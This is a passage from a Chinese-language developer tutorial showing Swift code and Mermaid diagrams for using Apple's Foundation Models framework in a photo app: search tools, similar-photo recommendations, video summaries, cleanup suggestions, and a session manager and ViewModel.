    <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
      
    <span class="hljs-keyword">let</span> photoDescriptions <span class="hljs-operator">=</span> photos.map { photo <span class="hljs-keyword">in</span>  
        <span class="hljs-string">"照片<span class="hljs-subst">\(photo.id)</span>: <span class="hljs-subst">\(photo.description <span class="hljs-operator">??</span> <span class="hljs-string">"无描述"</span>)</span> - <span class="hljs-subst">\(photo.date)</span>"</span>  
    }.joined(separator: <span class="hljs-string">"<span class="hljs-subst">\n</span>"</span>)  
      
    <span class="hljs-keyword">let</span> prompt <span class="hljs-operator">=</span> <span class="hljs-string">"""  
        分析以下照片，建议如何将它们组织成相册：  
          
        <span class="hljs-subst">\(photoDescriptions)</span>  
          
        请考虑：  
        1. 时间相关性  
        2. 地点相关性  
        3. 主题相关性  
        4. 人物相关性  
    """</span>  
      
    <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
        to: <span class="hljs-type">Prompt</span>(prompt),  
        generating: [<span class="hljs-type">AlbumSuggestion</span>].<span class="hljs-keyword">self</span>  
    )  
      
    <span class="hljs-keyword">return</span> response.content  
}  
</code></pre>
<h3 data-id="heading-36">3.2 智能搜索和推荐</h3>
<h4 data-id="heading-37">场景3: 自然语言搜索</h4>
<p><strong>搜索工作流程</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    User([用户输入:&lt;br/&gt;去年夏天在海边拍的照片]) --&gt; Parse[AI解析查询&lt;br/&gt;提取关键词]  
    Parse --&gt; Extract[提取信息&lt;br/&gt;时间: 去年夏天&lt;br/&gt;地点: 海边&lt;br/&gt;人物: 可选]  
    Extract --&gt; Tool[调用PhotoSearchTool&lt;br/&gt;searchPhotos]  
    Tool --&gt; Search[执行搜索&lt;br/&gt;匹配条件]  
    Search --&gt; Filter[筛选结果&lt;br/&gt;按相似度排序]  
    Filter --&gt; Result[返回照片列表]  
    Result --&gt; Display[展示给用户]  
      
    style User fill:#007AFF,color:#fff  
    style Parse fill:#5AC8FA,color:#000  
    style Extract fill:#5AC8FA,color:#000  
    style Tool fill:#FF9500,color:#fff  
    style Search fill:#FF9500,color:#fff  
    style Filter fill:#34C759,color:#fff  
    style Result fill:#34C759,color:#fff  
    style Display fill:#007AFF,color:#fff  
</code></pre>
<p><strong>Tool实现</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">PhotoSearchTool</span>: <span class="hljs-title class_">Tool</span> {  
    <span class="hljs-keyword">let</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"searchPhotos"</span>  
    <span class="hljs-keyword">let</span> description <span class="hljs-operator">=</span> <span class="hljs-string">"在相册中搜索照片，支持自然语言查询"</span>  
      
    <span class="hljs-meta">@Generable</span>  
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Arguments</span> {  
        <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"搜索查询，如'去年夏天在海边的照片'、'包含我妈妈的照片'"</span>)  
        <span class="hljs-keyword">var</span> query: <span class="hljs-type">String</span>  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">call</span>(<span class="hljs-params">arguments</span>: <span class="hljs-type">Arguments</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-keyword">some</span> <span class="hljs-type">PromptRepresentable</span> {  
        <span class="hljs-comment">// 解析自然语言查询  </span>
        <span class="hljs-keyword">let</span> searchCriteria <span class="hljs-operator">=</span> parseNaturalLanguageQuery(arguments.query)  
          
        <span class="hljs-comment">// 执行搜索  </span>
        <span class="hljs-keyword">let</span> results <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> performPhotoSearch(criteria: searchCriteria)  
          
        <span class="hljs-keyword">return</span> <span class="hljs-type">GeneratedContent</span>(properties: [  
            <span class="hljs-string">"count"</span>: results.count,  
            <span class="hljs-string">"photos"</span>: results.map { <span class="hljs-variable">$0</span>.toDictionary() }  
        ])  
    }  
      
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">parseNaturalLanguageQuery</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">query</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">SearchCriteria</span> {  
        <span class="hljs-comment">// 使用Foundation Models解析查询  </span>
        <span class="hljs-comment">// 提取：时间、地点、人物、关键词等  </span>
    }  
}

<span class="hljs-comment">// 使用示例  </span>
<span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>(tools: [<span class="hljs-type">PhotoSearchTool</span>()])  
<span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
    to: <span class="hljs-string">"帮我找一下去年夏天在海边拍的照片，要包含我女朋友的"</span>  
)  
</code></pre>
<h4 data-id="heading-38">场景4: 智能推荐相似照片</h4>
<p><strong>推荐算法流程</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD  
    Target[目标照片] --&gt; Extract[提取特征&lt;br/&gt;描述、地点、时间、人物、标签]  
    Extract --&gt; Compare[与相册中其他照片&lt;br/&gt;进行特征比较]  
    Compare --&gt; Score[计算相似度评分&lt;br/&gt;多维度加权]  
    Score --&gt; Sort[按相似度排序]  
    Sort --&gt; Filter[筛选Top 5]  
    Filter --&gt; Result[生成推荐结果&lt;br/&gt;包含相似原因]  
      
    style Target fill:#007AFF,color:#fff  
    style Extract fill:#5AC8FA,color:#000  
    style Compare fill:#FF9500,color:#fff  
    style Score fill:#FF9500,color:#fff  
    style Sort fill:#34C759,color:#fff  
    style Filter fill:#34C759,color:#fff  
    style Result fill:#007AFF,color:#fff  
</code></pre>
<p><strong>代码实现</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@Generable</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">SimilarPhotoRecommendation</span> {  
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"推荐的照片ID"</span>)  
    <span class="hljs-keyword">let</span> photoId: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"相似度评分，1-10分"</span>)  
    <span class="hljs-keyword">let</span> similarityScore: <span class="hljs-type">Int</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"相似的原因"</span>)  
    <span class="hljs-keyword">let</span> reason: <span class="hljs-type">String</span>  
}

<span class="hljs-keyword">func</span> <span class="hljs-title function_">findSimilarPhotos</span>(<span class="hljs-params">to</span> <span class="hljs-params">targetPhoto</span>: <span class="hljs-type">Photo</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; [<span class="hljs-type">SimilarPhotoRecommendation</span>] {  
    <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
      
    <span class="hljs-keyword">let</span> prompt <span class="hljs-operator">=</span> <span class="hljs-string">"""  
        基于以下照片特征，推荐相似的照片：  
          
        目标照片:  
        - 描述: <span class="hljs-subst">\(targetPhoto.description <span class="hljs-operator">??</span> <span class="hljs-string">"无"</span>)</span>  
        - 地点: <span class="hljs-subst">\(targetPhoto.location <span class="hljs-operator">??</span> <span class="hljs-string">"未知"</span>)</span>  
        - 时间: <span class="hljs-subst">\(targetPhoto.date)</span>  
        - 人物: <span class="hljs-subst">\(targetPhoto.people.joined(separator: <span class="hljs-string">", "</span>))</span>  
        - 标签: <span class="hljs-subst">\(targetPhoto.tags.joined(separator: <span class="hljs-string">", "</span>))</span>  
          
        请从用户相册中推荐5张最相似的照片。  
    """</span>  
      
    <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
        to: <span class="hljs-type">Prompt</span>(prompt),  
        generating: [<span class="hljs-type">SimilarPhotoRecommendation</span>].<span class="hljs-keyword">self</span>  
    )  
      
    <span class="hljs-keyword">return</span> response.content  
}  
</code></pre>
<h3 data-id="heading-39">3.3 视频内容理解</h3>
<h4 data-id="heading-40">场景5: 视频摘要生成</h4>
<p><strong>视频分析流程</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Video[视频文件] --&gt; Metadata[提取元数据&lt;br/&gt;时长、时间、地点]  
    Metadata --&gt; KeyFrames[提取关键帧&lt;br/&gt;描述关键画面]  
    KeyFrames --&gt; Build[构建Prompt&lt;br/&gt;包含所有信息]  
    Build --&gt; AI[AI分析&lt;br/&gt;理解视频内容]  
    AI --&gt; Summary[生成摘要&lt;br/&gt;简短描述]  
    AI --&gt; Moments[提取关键时刻&lt;br/&gt;时间戳+描述]  
    AI --&gt; Theme[识别主题]  
    AI --&gt; Thumbnail[建议封面时间]  
    Summary --&gt; Result[返回VideoSummary]  
    Moments --&gt; Result  
    Theme --&gt; Result  
    Thumbnail --&gt; Result  
      
    style Video fill:#007AFF,color:#fff  
    style Metadata fill:#5AC8FA,color:#000  
    style KeyFrames fill:#5AC8FA,color:#000  
    style Build fill:#5AC8FA,color:#000  
    style AI fill:#FF9500,color:#fff  
    style Result fill:#34C759,color:#fff  
</code></pre>
<p><strong>数据模型</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@Generable</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">VideoSummary</span> {  
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"视频的简短摘要，100字以内"</span>)  
    <span class="hljs-keyword">let</span> summary: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"视频的关键时刻时间戳列表"</span>)  
    <span class="hljs-keyword">let</span> keyMoments: [<span class="hljs-type">KeyMoment</span>]  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"视频的主题"</span>)  
    <span class="hljs-keyword">let</span> theme: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"建议的封面帧时间"</span>)  
    <span class="hljs-keyword">let</span> suggestedThumbnailTime: <span class="hljs-type">Double</span>  
}

<span class="hljs-meta">@Generable</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">KeyMoment</span> {  
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"时刻的时间戳（秒）"</span>)  
    <span class="hljs-keyword">let</span> timestamp: <span class="hljs-type">Double</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"时刻的描述"</span>)  
    <span class="hljs-keyword">let</span> description: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"重要性评分，1-10"</span>)  
    <span class="hljs-keyword">let</span> importance: <span class="hljs-type">Int</span>  
}  
</code></pre>
<h3 data-id="heading-41">3.4 智能相册管理</h3>
<h4 data-id="heading-42">场景6: 自动整理和清理建议</h4>
<p><strong>清理建议流程</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Photos[照片列表] --&gt; Analyze[分析每张照片&lt;br/&gt;质量、大小、日期、描述]  
    Analyze --&gt; Criteria[应用清理标准&lt;br/&gt;模糊、重复、低质量、临时]  
    Criteria --&gt; Score[计算清理优先级&lt;br/&gt;综合评分]  
    Score --&gt; Sort[按优先级排序]  
    Sort --&gt; Suggest[生成清理建议&lt;br/&gt;包含原因和空间]  
    Suggest --&gt; Result[返回CleanupSuggestion]  
      
    style Photos fill:#007AFF,color:#fff  
    style Analyze fill:#5AC8FA,color:#000  
    style Criteria fill:#FF9500,color:#fff  
    style Score fill:#FF9500,color:#fff  
    style Sort fill:#34C759,color:#fff  
    style Suggest fill:#34C759,color:#fff  
    style Result fill:#007AFF,color:#fff  
</code></pre>
<p><strong>代码实现</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@Generable</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">CleanupSuggestion</span> {  
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"建议删除的照片ID列表"</span>)  
    <span class="hljs-keyword">let</span> photosToDelete: [<span class="hljs-type">String</span>]  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"删除原因"</span>)  
    <span class="hljs-keyword">let</span> reason: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"预计可释放的存储空间（MB）"</span>)  
    <span class="hljs-keyword">let</span> spaceToFree: <span class="hljs-type">Double</span>  
}

<span class="hljs-keyword">func</span> <span class="hljs-title function_">suggestCleanup</span>(<span class="hljs-params">for</span> <span class="hljs-params">photos</span>: [<span class="hljs-type">Photo</span>]) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">CleanupSuggestion</span> {  
    <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>(  
        instructions: <span class="hljs-type">Instructions</span>(  
            <span class="hljs-string">"你是一个相册管理助手，帮助用户清理重复、模糊或低质量的照片。"</span>  
        )  
    )  
      
    <span class="hljs-keyword">let</span> photoList <span class="hljs-operator">=</span> photos.map { photo <span class="hljs-keyword">in</span>  
        <span class="hljs-string">"""  
        照片<span class="hljs-subst">\(photo.id)</span>:  
        - 大小: <span class="hljs-subst">\(photo.fileSize)</span>MB  
        - 质量: <span class="hljs-subst">\(photo.qualityScore)</span>/10  
        - 日期: <span class="hljs-subst">\(photo.date)</span>  
        - 描述: <span class="hljs-subst">\(photo.description <span class="hljs-operator">??</span> <span class="hljs-string">"无"</span>)</span>  
        """</span>  
    }.joined(separator: <span class="hljs-string">"<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>"</span>)  
      
    <span class="hljs-keyword">let</span> prompt <span class="hljs-operator">=</span> <span class="hljs-string">"""  
        分析以下照片，建议哪些可以删除以释放存储空间：  
          
        <span class="hljs-subst">\(photoList)</span>  
          
        考虑因素：  
        1. 照片质量（模糊、过曝、欠曝）  
        2. 重复照片  
        3. 截图和临时照片  
        4. 用户可能不需要的照片  
    """</span>  
      
    <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
        to: <span class="hljs-type">Prompt</span>(prompt),  
        generating: <span class="hljs-type">CleanupSuggestion</span>.<span class="hljs-keyword">self</span>  
    )  
      
    <span class="hljs-keyword">return</span> response.content  
}  
</code></pre>
<hr/>
<h2 data-id="heading-43">💡 第四部分：实际编码实践和最佳实践 </h2>
<h3 data-id="heading-44">4.1 从零开始：实际开发流程</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Start([开始集成Foundation Models]) --&gt; Step1[步骤1: 检查模型可用性&lt;br/&gt;SystemLanguageModel.default]  
    Step1 --&gt; Check{模型可用?}  
    Check --&gt;|否| Error[显示错误提示&lt;br/&gt;提供降级方案]  
    Check --&gt;|是| Step2[步骤2: 创建Session管理器&lt;br/&gt;PhotoAISessionManager]  
    Step2 --&gt; Step3[步骤3: 集成到ViewModel&lt;br/&gt;PhotoAnalysisViewModel]  
    Step3 --&gt; Step4[步骤4: 在SwiftUI中使用&lt;br/&gt;PhotoAnalysisView]  
    Step4 --&gt; Success([完成集成])  
    Error --&gt; End([结束])  
    Success --&gt; End  
      
    style Start fill:#007AFF,color:#fff  
    style Step1 fill:#5AC8FA,color:#000  
    style Step2 fill:#5AC8FA,color:#000  
    style Step3 fill:#5AC8FA,color:#000  
    style Step4 fill:#5AC8FA,color:#000  
    style Check fill:#FF9500,color:#fff  
    style Error fill:#FF3B30,color:#fff  
    style Success fill:#34C759,color:#fff  
</code></pre>
<h4 data-id="heading-45">步骤1: 检查模型可用性</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> FoundationModels

<span class="hljs-keyword">class</span> <span class="hljs-title class_">FoundationModelsManager</span> {  
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> shared <span class="hljs-operator">=</span> <span class="hljs-type">FoundationModelsManager</span>()  
      
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">init</span>() {}  
      
    <span class="hljs-comment">/// 检查Foundation Models是否可用  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">checkAvailability</span>() -&gt; (available: <span class="hljs-type">Bool</span>, reason: <span class="hljs-type">String</span>?) {  
        <span class="hljs-keyword">let</span> model <span class="hljs-operator">=</span> <span class="hljs-type">SystemLanguageModel</span>.default  
        <span class="hljs-keyword">switch</span> model.availability {  
        <span class="hljs-keyword">case</span> .available:  
            <span class="hljs-keyword">return</span> (<span class="hljs-literal">true</span>, <span class="hljs-literal">nil</span>)  
        <span class="hljs-keyword">case</span> .unavailable(<span class="hljs-keyword">let</span> reason):  
            <span class="hljs-keyword">return</span> (<span class="hljs-literal">false</span>, reason.localizedDescription)  
        }  
    }  
      
    <span class="hljs-comment">/// 在应用启动时检查并预热  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">setup</span>() <span class="hljs-keyword">async</span> {  
        <span class="hljs-keyword">let</span> (available, reason) <span class="hljs-operator">=</span> checkAvailability()  
        <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>available {  
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"⚠️ Foundation Models不可用: <span class="hljs-subst">\(reason <span class="hljs-operator">??</span> <span class="hljs-string">"未知原因"</span>)</span>"</span>)  
            <span class="hljs-keyword">return</span>  
        }  
          
        <span class="hljs-comment">// 预热模型（可选，但推荐）  </span>
        <span class="hljs-keyword">await</span> prewarmModel()  
    }  
      
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">prewarmModel</span>() <span class="hljs-keyword">async</span> {  
        <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
        <span class="hljs-keyword">do</span> {  
            <span class="hljs-keyword">_</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(to: <span class="hljs-string">"Hello"</span>)  
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ Foundation Models预热成功"</span>)  
        } <span class="hljs-keyword">catch</span> {  
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"⚠️ 模型预热失败: <span class="hljs-subst">\(error)</span>"</span>)  
        }  
    }  
}

<span class="hljs-comment">// 在App启动时调用  </span>
<span class="hljs-keyword">@main</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyApp</span>: <span class="hljs-title class_">App</span> {  
    <span class="hljs-keyword">init</span>() {  
        <span class="hljs-type">Task</span> {  
            <span class="hljs-keyword">await</span> <span class="hljs-type">FoundationModelsManager</span>.shared.setup()  
        }  
    }  
}  
</code></pre>
<h4 data-id="heading-46">步骤2: 创建可复用的Session管理器</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">classDiagram  
    class PhotoAISessionManager {  
        -LanguageModelSession session  
        -[Tool] tools  
        +sendMessage(String) String  
        +streamMessage(String) AsyncStream  
        +generateStructured(T) T  
        +reset()  
    }  
      
    class LanguageModelSession {  
        +respond(Prompt) Response  
        +streamResponse(Prompt) AsyncStream  
        +transcript Transcript  
    }  
      
    class PhotoSearchTool {  
        +name: String  
        +description: String  
        +call(Arguments) Output  
    }  
      
    class PhotoAnalysisTool {  
        +name: String  
        +description: String  
        +call(Arguments) Output  
    }  
      
    PhotoAISessionManager --&gt; LanguageModelSession  
    PhotoAISessionManager --&gt; PhotoSearchTool  
    PhotoAISessionManager --&gt; PhotoAnalysisTool  
</code></pre>
<p><strong>完整实现</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> FoundationModels  
<span class="hljs-keyword">import</span> Observation

<span class="hljs-meta">@Observable</span>  
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PhotoAISessionManager</span> {  
    <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> session: <span class="hljs-type">LanguageModelSession</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> tools: [<span class="hljs-keyword">any</span> <span class="hljs-type">Tool</span>]  
      
    <span class="hljs-keyword">init</span>() {  
        <span class="hljs-keyword">self</span>.tools <span class="hljs-operator">=</span> [  
            <span class="hljs-type">PhotoSearchTool</span>(),  
            <span class="hljs-type">PhotoAnalysisTool</span>(),  
            <span class="hljs-type">AlbumCreationTool</span>()  
        ]  
          
        <span class="hljs-keyword">self</span>.session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>(  
            tools: tools,  
            instructions: <span class="hljs-type">Instructions</span>(<span class="hljs-string">"""  
                你是一个智能相册助手，可以帮助用户：  
                1. 搜索照片（使用searchPhotos工具）  
                2. 分析照片内容（使用analyzePhoto工具）  
                3. 创建相册（使用createAlbum工具）  
                  
                始终用友好、自然的方式与用户交流。  
            """</span>)  
        )  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">sendMessage</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">String</span> {  
        <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(to: <span class="hljs-type">Prompt</span>(message))  
        <span class="hljs-keyword">return</span> response.content  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">streamMessage</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">AsyncThrowingStream</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Error</span>&gt; {  
        <span class="hljs-type">AsyncThrowingStream</span> { continuation <span class="hljs-keyword">in</span>  
            <span class="hljs-type">Task</span> {  
                <span class="hljs-keyword">do</span> {  
                    <span class="hljs-keyword">let</span> stream <span class="hljs-operator">=</span> session.streamResponse(to: <span class="hljs-type">Prompt</span>(message))  
                    <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> partialText <span class="hljs-keyword">in</span> stream {  
                        continuation.yield(partialText)  
                    }  
                    continuation.finish()  
                } <span class="hljs-keyword">catch</span> {  
                    continuation.finish(throwing: error)  
                }  
            }  
        }  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">generateStructured</span>&lt;<span class="hljs-type">T</span>: <span class="hljs-type">Generable</span>&gt;(  
        <span class="hljs-params">prompt</span>: <span class="hljs-type">String</span>,  
        <span class="hljs-params">type</span>: <span class="hljs-type">T</span>.<span class="hljs-keyword">Type</span>  
    ) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">T</span> {  
        <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
            to: <span class="hljs-type">Prompt</span>(prompt),  
            generating: type  
        )  
        <span class="hljs-keyword">return</span> response.content  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">reset</span>() {  
        <span class="hljs-keyword">self</span>.session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>(  
            tools: tools,  
            instructions: <span class="hljs-type">Instructions</span>(<span class="hljs-string">"你是一个智能相册助手"</span>)  
        )  
    }  
}  
</code></pre>
<h4 data-id="heading-47">步骤3: 集成到ViewModel</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB  
    subgraph "View Layer"  
        View[PhotoAnalysisView&lt;br/&gt;SwiftUI View]  
    end  
      
    subgraph "ViewModel Layer"  
        ViewModel[PhotoAnalysisViewModel&lt;br/&gt;@Observable]  
        SessionManager[PhotoAISessionManager]  
    end  
      
    subgraph "Model Layer"  
        Model[Photo Model]  
        FoundationModels[Foundation Models]  
    end  
      
    View --&gt;|@State| ViewModel  
    ViewModel --&gt;|调用| SessionManager  
    SessionManager --&gt;|使用| FoundationModels  
    ViewModel --&gt;|操作| Model  
    Model --&gt;|更新| ViewModel  
    ViewModel --&gt;|通知| View  
      
    style View fill:#007AFF,color:#fff  
    style ViewModel fill:#5AC8FA,color:#000  
    style SessionManager fill:#FF9500,color:#fff  
    style Model fill:#34C759,color:#fff  
    style FoundationModels fill:#FF3B30,color:#fff  
</code></pre>
<p><strong>ViewModel实现</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@Observable</span>  
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PhotoAnalysisViewModel</span> {  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> sessionManager <span class="hljs-operator">=</span> <span class="hljs-type">PhotoAISessionManager</span>()  
      
    <span class="hljs-keyword">var</span> isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>  
    <span class="hljs-keyword">var</span> errorMessage: <span class="hljs-type">String</span>?  
    <span class="hljs-keyword">var</span> analysisResult: <span class="hljs-type">PhotoDescription</span>?  
    <span class="hljs-keyword">var</span> streamingText <span class="hljs-operator">=</span> <span class="hljs-string">""</span>  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">analyzePhoto</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">photo</span>: <span class="hljs-type">Photo</span>) <span class="hljs-keyword">async</span> {  
        isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>  
        errorMessage <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>  
          
        <span class="hljs-keyword">do</span> {  
            <span class="hljs-keyword">let</span> metadata <span class="hljs-operator">=</span> photo.metadata  
            <span class="hljs-keyword">let</span> prompt <span class="hljs-operator">=</span> <span class="hljs-string">"""  
                分析这张照片：  
                - 时间: <span class="hljs-subst">\(metadata.date)</span>  
                - 地点: <span class="hljs-subst">\(metadata.location <span class="hljs-operator">??</span> <span class="hljs-string">"未知"</span>)</span>  
                - EXIF: <span class="hljs-subst">\(metadata.exifInfo)</span>  
                  
                请生成详细的照片描述和分类建议。  
            """</span>  
              
            <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> sessionManager.generateStructured(  
                prompt: prompt,  
                type: <span class="hljs-type">PhotoDescription</span>.<span class="hljs-keyword">self</span>  
            )  
              
            <span class="hljs-keyword">await</span> <span class="hljs-type">MainActor</span>.run {  
                <span class="hljs-keyword">self</span>.analysisResult <span class="hljs-operator">=</span> result  
                <span class="hljs-keyword">self</span>.isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>  
            }  
        } <span class="hljs-keyword">catch</span> {  
            <span class="hljs-keyword">await</span> <span class="hljs-type">MainActor</span>.run {  
                <span class="hljs-keyword">self</span>.errorMessage <span class="hljs-operator">=</span> handleError(error)  
                <span class="hljs-keyword">self</span>.isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>  
            }  
        }  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">analyzePhotoWithStreaming</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">photo</span>: <span class="hljs-type">Photo</span>) <span class="hljs-keyword">async</span> {  
        isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>  
        streamingText <span class="hljs-operator">=</span> <span class="hljs-string">""</span>  
        errorMessage <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>  
          
        <span class="hljs-keyword">do</span> {  
            <span class="hljs-keyword">let</span> metadata <span class="hljs-operator">=</span> photo.metadata  
            <span class="hljs-keyword">let</span> prompt <span class="hljs-operator">=</span> <span class="hljs-string">"""  
                分析这张照片：  
                - 时间: <span class="hljs-subst">\(metadata.date)</span>  
                - 地点: <span class="hljs-subst">\(metadata.location <span class="hljs-operator">??</span> <span class="hljs-string">"未知"</span>)</span>  
                  
                请详细分析照片内容。  
            """</span>  
              
            <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> partialText <span class="hljs-keyword">in</span> sessionManager.streamMessage(prompt) {  
                <span class="hljs-keyword">await</span> <span class="hljs-type">MainActor</span>.run {  
                    <span class="hljs-keyword">self</span>.streamingText <span class="hljs-operator">+=</span> partialText  
                }  
            }  
              
            <span class="hljs-keyword">await</span> <span class="hljs-type">MainActor</span>.run {  
                <span class="hljs-keyword">self</span>.isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>  
            }  
        } <span class="hljs-keyword">catch</span> {  
            <span class="hljs-keyword">await</span> <span class="hljs-type">MainActor</span>.run {  
                <span class="hljs-keyword">self</span>.errorMessage <span class="hljs-operator">=</span> handleError(error)  
                <span class="hljs-keyword">self</span>.isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>  
            }  
        }  
    }  
      
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">handleError</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">error</span>: <span class="hljs-type">Error</span>) -&gt; <span class="hljs-type">String</span> {  
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> generationError <span class="hljs-operator">=</span> error <span class="hljs-keyword">as?</span> <span class="hljs-type">LanguageModelSession</span>.<span class="hljs-type">GenerationError</span> {  
            <span class="hljs-keyword">switch</span> generationError {  
            <span class="hljs-keyword">case</span> .exceededContextWindowSize:  
                <span class="hljs-keyword">return</span> <span class="hljs-string">"对话内容过长，请清理历史记录"</span>  
            <span class="hljs-keyword">default</span>:  
